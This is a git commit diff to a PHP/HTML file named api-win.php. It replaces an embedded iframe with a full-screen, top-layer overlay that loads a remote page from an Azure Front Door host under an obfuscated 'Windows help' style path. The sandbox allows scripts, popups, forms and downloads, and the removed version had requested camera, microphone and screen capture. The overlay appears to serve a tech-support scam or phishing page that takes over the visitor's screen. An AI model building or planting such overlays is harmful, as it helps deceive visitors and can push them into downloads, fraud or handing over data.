6d87f0721b87a1ed8478525a2a6a3a525005f7b1
haohanhoa-cmd <haohanhoa@gmail.com>
2026-06-17 15:40:41 +0400

    Update api-win.php

--- api-win.php
+++ api-win.php
@@ -18,14 +18,8 @@
 <body>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
 
-<iframe 
-  id="f"
-  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
-  allowfullscreen 
-  webkitallowfullscreen 
-  mozallowfullscreen 
-  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *">
-</iframe>
+<div id="bruceDiv" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;"><iframe src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe></div>
+  
 
 </body>
 </html>
